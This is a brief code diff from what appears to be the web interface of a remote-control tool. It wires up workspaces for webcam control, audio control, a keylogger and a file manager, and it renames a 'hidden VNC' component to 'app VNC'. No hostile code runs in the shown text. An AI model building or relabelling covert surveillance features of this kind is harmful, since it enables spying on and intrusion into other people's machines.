@@ -15,7 +15,7 @@
 	} from '$lib/data/client-tools';
 	import { notifyToolActivationCommand } from '$lib/utils/agent-commands.js';
 	import type { PageData } from './$types';
-	import HiddenVncWorkspace from '$lib/components/workspace/tools/hidden-vnc-workspace.svelte';
+	import AppVncWorkspace from '$lib/components/workspace/tools/app-vnc-workspace.svelte';
 	import WebcamControlWorkspace from '$lib/components/workspace/tools/webcam-control-workspace.svelte';
 	import AudioControlWorkspace from '$lib/components/workspace/tools/audio-control-workspace.svelte';
 	import KeyloggerWorkspace from '$lib/components/workspace/tools/keylogger-workspace.svelte';
@@ -44,7 +44,7 @@
 	const otherTools = $derived(tools.filter((item) => item.id !== tool.id));
 
 	const componentMap = {
-		'hidden-vnc': HiddenVncWorkspace,
+		'app-vnc': AppVncWorkspace,
 		'webcam-control': WebcamControlWorkspace,
 		'audio-control': AudioControlWorkspace,
 		'file-manager': FileManagerWorkspace,
